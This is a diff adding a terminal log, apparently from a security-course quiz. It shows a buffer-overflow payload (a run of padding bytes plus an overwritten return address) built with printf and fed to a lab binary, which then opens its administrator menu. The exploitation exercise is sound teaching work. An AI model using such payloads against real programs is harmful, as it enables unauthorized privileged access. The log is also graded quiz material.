@@ -1,0 +1,7 @@
+root@DESKTOP-LQUE2RU:~/epl326_q3/QUIZ2/QUIZ2/1048972# echo `printf "100 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xac\x88\x04\x08
+"` > file.11
+root@DESKTOP-LQUE2RU:~/epl326_q3/QUIZ2/QUIZ2/1048972# ./run.sh ./bin.1 ./file.11
+Rendering record (size: 100):
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(AAAAAAAAAAAA  
+                                       
+Welcome to the administrator's menu.
